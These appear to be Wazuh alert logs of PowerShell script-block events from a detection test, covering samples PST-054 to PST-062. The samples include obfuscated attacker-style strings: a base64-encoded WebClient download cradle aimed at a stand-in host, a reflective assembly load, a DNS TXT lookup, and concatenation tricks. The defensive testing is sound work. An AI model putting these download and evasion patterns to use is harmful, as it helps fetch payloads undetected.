{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"7cb9137a-6820-4fe9-8722-e458ec741172","scriptBlockText":"$sampleId='PST-054'; (Get-ChildItem -Path $env:TEMP -File -ErrorAction SilentlyContinue | Measure-Object).Count; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721719","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-054'; (Get-ChildItem -Path $env:TEMP -File -ErrorAction SilentlyContinue | Measure-Object).Count; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 7cb9137a-6820-4fe9-8722-e458ec741172\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:51.8145928Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:51.8145928Z\",\"eventRecordID\":\"721719\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-054'; (Get-ChildItem -Path $env:TEMP -File -ErrorAction SilentlyContinue | Measure-Object).Count; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 7cb9137a-6820-4fe9-8722-e458ec741172\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-054'; (Get-ChildItem -Path $env:TEMP -File -ErrorAction SilentlyContinue | Measure-Object).Count; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"7cb9137a-6820-4fe9-8722-e458ec741172\"}}}","id":"1784280952.419851","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script querying system environment variables","firedtimes":7,"groups":["windows"," powershell"],"id":"91816","level":4,"mail":false,"mitre":{"id":["T1082"],"tactic":["Discovery"],"technique":["System Information Discovery"]}},"timestamp":"2026-07-17T11:35:52.626+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"ed93d300-9644-42ed-a2b0-d017c48a1c16","scriptBlockText":"$sampleId='PST-055'; $indicator='[ReFLection.asSemBLy]::LOaD([CONVERT]::fRombaSE64STRiNG(''vehfu0LtLUlOrVJUluRVtU1z''))'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721723","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-055'; $indicator='[ReFLection.asSemBLy]::LOaD([CONVERT]::fRombaSE64STRiNG(''vehfu0LtLUlOrVJUluRVtU1z''))'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: ed93d300-9644-42ed-a2b0-d017c48a1c16\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:52.1555907Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:52.1555907Z\",\"eventRecordID\":\"721723\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-055'; $indicator='[ReFLection.asSemBLy]::LOaD([CONVERT]::fRombaSE64STRiNG(''vehfu0LtLUlOrVJUluRVtU1z''))'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: ed93d300-9644-42ed-a2b0-d017c48a1c16\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-055'; $indicator='[ReFLection.asSemBLy]::LOaD([CONVERT]::fRombaSE64STRiNG(''vehfu0LtLUlOrVJUluRVtU1z''))'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"ed93d300-9644-42ed-a2b0-d017c48a1c16\"}}}","id":"1784280952.419851","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script may be using Base64 decoding method","firedtimes":6,"groups":["windows"," powershell"],"id":"91809","level":10,"mail":false,"mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]}},"timestamp":"2026-07-17T11:35:52.631+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"783e2604-1eb7-4297-892f-1d40a24c0c32","scriptBlockText":"$sampleId='PST-056'; Get-SmbShare -ErrorAction SilentlyContinue | Select-Object -First 5 Name, Path; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721727","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-056'; Get-SmbShare -ErrorAction SilentlyContinue | Select-Object -First 5 Name, Path; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 783e2604-1eb7-4297-892f-1d40a24c0c32\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:52.4818773Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:52.4818773Z\",\"eventRecordID\":\"721727\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-056'; Get-SmbShare -ErrorAction SilentlyContinue | Select-Object -First 5 Name, Path; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 783e2604-1eb7-4297-892f-1d40a24c0c32\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-056'; Get-SmbShare -ErrorAction SilentlyContinue | Select-Object -First 5 Name, Path; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"783e2604-1eb7-4297-892f-1d40a24c0c32\"}}}","id":"1784280952.422279","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:52.650+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"4c54e487-b765-462a-83f5-8e1148dc1936","scriptBlockText":"$sampleId='PST-057'; $indicator='ReSOlvE-dnsnAme -TyPE Txt -nAmE ''task.eXAmplE.InvaLiD'' | sELeCT-obJECT -exPANDprOpeRtY StrInGS'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721804","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-057'; $indicator='ReSOlvE-dnsnAme -TyPE Txt -nAmE ''task.eXAmplE.InvaLiD'' | sELeCT-obJECT -exPANDprOpeRtY StrInGS'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 4c54e487-b765-462a-83f5-8e1148dc1936\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:53.8555855Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:53.8555855Z\",\"eventRecordID\":\"721804\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-057'; $indicator='ReSOlvE-dnsnAme -TyPE Txt -nAmE ''task.eXAmplE.InvaLiD'' | sELeCT-obJECT -exPANDprOpeRtY StrInGS'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 4c54e487-b765-462a-83f5-8e1148dc1936\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-057'; $indicator='ReSOlvE-dnsnAme -TyPE Txt -nAmE ''task.eXAmplE.InvaLiD'' | sELeCT-obJECT -exPANDprOpeRtY StrInGS'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"4c54e487-b765-462a-83f5-8e1148dc1936\"}}}","id":"1784280954.422279","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:54.734+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"c843cf6e-b094-4bd0-83b7-719195dea2f6","scriptBlockText":"$sampleId='PST-058'; $parts=@('Get-Pro','cess |',' Se','lect-Obj','ect Na','me,','Id,Pa','th'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721807","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-058'; $parts=@('Get-Pro','cess |',' Se','lect-Obj','ect Na','me,','Id,Pa','th'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: c843cf6e-b094-4bd0-83b7-719195dea2f6\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:54.1844201Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:54.1844201Z\",\"eventRecordID\":\"721807\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-058'; $parts=@('Get-Pro','cess |',' Se','lect-Obj','ect Na','me,','Id,Pa','th'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: c843cf6e-b094-4bd0-83b7-719195dea2f6\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-058'; $parts=@('Get-Pro','cess |',' Se','lect-Obj','ect Na','me,','Id,Pa','th'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"c843cf6e-b094-4bd0-83b7-719195dea2f6\"}}}","id":"1784280954.422279","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:54.759+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"ba784878-77b5-4aaa-b5a2-0e7e59afba78","scriptBlockText":"$sampleId='PST-059'; Test-Path -Path $env:TEMP; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721821","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-059'; Test-Path -Path $env:TEMP; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: ba784878-77b5-4aaa-b5a2-0e7e59afba78\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:54.5120423Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:54.5120423Z\",\"eventRecordID\":\"721821\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-059'; Test-Path -Path $env:TEMP; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: ba784878-77b5-4aaa-b5a2-0e7e59afba78\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-059'; Test-Path -Path $env:TEMP; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"ba784878-77b5-4aaa-b5a2-0e7e59afba78\"}}}","id":"1784280954.422279","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script querying system environment variables","firedtimes":8,"groups":["windows"," powershell"],"id":"91816","level":4,"mail":false,"mitre":{"id":["T1082"],"tactic":["Discovery"],"technique":["System Information Discovery"]}},"timestamp":"2026-07-17T11:35:54.962+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"f93885df-4ae5-4510-b69e-4470251a1921","scriptBlockText":"$sampleId='PST-060'; Get-ChildItem Env: | Select-Object -First 6 Name, Value; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721823","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-060'; Get-ChildItem Env: | Select-Object -First 6 Name, Value; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: f93885df-4ae5-4510-b69e-4470251a1921\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:54.8339514Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:54.8339514Z\",\"eventRecordID\":\"721823\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-060'; Get-ChildItem Env: | Select-Object -First 6 Name, Value; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: f93885df-4ae5-4510-b69e-4470251a1921\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-060'; Get-ChildItem Env: | Select-Object -First 6 Name, Value; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"f93885df-4ae5-4510-b69e-4470251a1921\"}}}","id":"1784280955.424710","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script searching filesystem","firedtimes":2,"groups":["windows"," powershell"],"id":"91819","level":4,"mail":false,"mitre":{"id":["T1083"],"tactic":["Discovery"],"technique":["File and Directory Discovery"]}},"timestamp":"2026-07-17T11:35:55.748+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"b876b669-8365-446a-97e9-e82a28b3e3c6","scriptBlockText":"$sampleId='PST-061'; $encoded='JAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACAAJAB3AGMALgBQAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBEAGUAZgBhAHUAbAB0AFcAZQBiAFAAcgBvAHgAeQA7ACAAJAB3AGMALgBIAGUAYQBkAGUAcgBzAFsAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcAXQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACcAOwAgACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AYwBkAG4ALgBlAHgAYQBtAHAAbABlAC4AaQBuAHYAYQBsAGkAZAAvAGEAJwApAA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721825","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-061'; $encoded='JAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACAAJAB3AGMALgBQAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBEAGUAZgBhAHUAbAB0AFcAZQBiAFAAcgBvAHgAeQA7ACAAJAB3AGMALgBIAGUAYQBkAGUAcgBzAFsAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcAXQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACcAOwAgACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AYwBkAG4ALgBlAHgAYQBtAHAAbABlAC4AaQBuAHYAYQBsAGkAZAAvAGEAJwApAA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: b876b669-8365-446a-97e9-e82a28b3e3c6\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:55.1771465Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:55.1771465Z\",\"eventRecordID\":\"721825\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-061'; $encoded='JAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACAAJAB3AGMALgBQAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBEAGUAZgBhAHUAbAB0AFcAZQBiAFAAcgBvAHgAeQA7ACAAJAB3AGMALgBIAGUAYQBkAGUAcgBzAFsAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcAXQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACcAOwAgACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AYwBkAG4ALgBlAHgAYQBtAHAAbABlAC4AaQBuAHYAYQBsAGkAZAAvAGEAJwApAA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: b876b669-8365-446a-97e9-e82a28b3e3c6\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-061'; $encoded='JAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACAAJAB3AGMALgBQAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBEAGUAZgBhAHUAbAB0AFcAZQBiAFAAcgBvAHgAeQA7ACAAJAB3AGMALgBIAGUAYQBkAGUAcgBzAFsAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcAXQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACcAOwAgACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AYwBkAG4ALgBlAHgAYQBtAHAAbABlAC4AaQBuAHYAYQBsAGkAZAAvAGEAJwApAA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"b876b669-8365-446a-97e9-e82a28b3e3c6\"}}}","id":"1784280955.426746","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script may be using Base64 decoding method","firedtimes":7,"groups":["windows"," powershell"],"id":"91809","level":10,"mail":false,"mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]}},"timestamp":"2026-07-17T11:35:55.751+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"beab8933-e6c9-4468-8636-78fb2be39cc9","scriptBlockText":"$sampleId='PST-062'; $parts=@('Get-Ch','ildItem ''','C:\\\\User','s'' -R','ecurse -F','orce ','-ErrorAc','tion Sile','ntlyContinue'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721830","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-062'; $parts=@('Get-Ch','ildItem ''','C:\\User','s'' -R','ecurse -F','orce ','-ErrorAc','tion Sile','ntlyContinue'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: beab8933-e6c9-4468-8636-78fb2be39cc9\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:55.5036201Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:55.5036201Z\",\"eventRecordID\":\"721830\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-062'; $parts=@('Get-Ch','ildItem ''','C:\\\\User','s'' -R','ecurse -F','orce ','-ErrorAc','tion Sile','ntlyContinue'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: beab8933-e6c9-4468-8636-78fb2be39cc9\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-062'; $parts=@('Get-Ch','ildItem ''','C:\\\\\\\\User','s'' -R','ecurse -F','orce ','-ErrorAc','tion Sile','ntlyContinue'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"beab8933-e6c9-4468-8636-78fb2be39cc9\"}}}","id":"1784280955.428885","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:55.763+0200"}
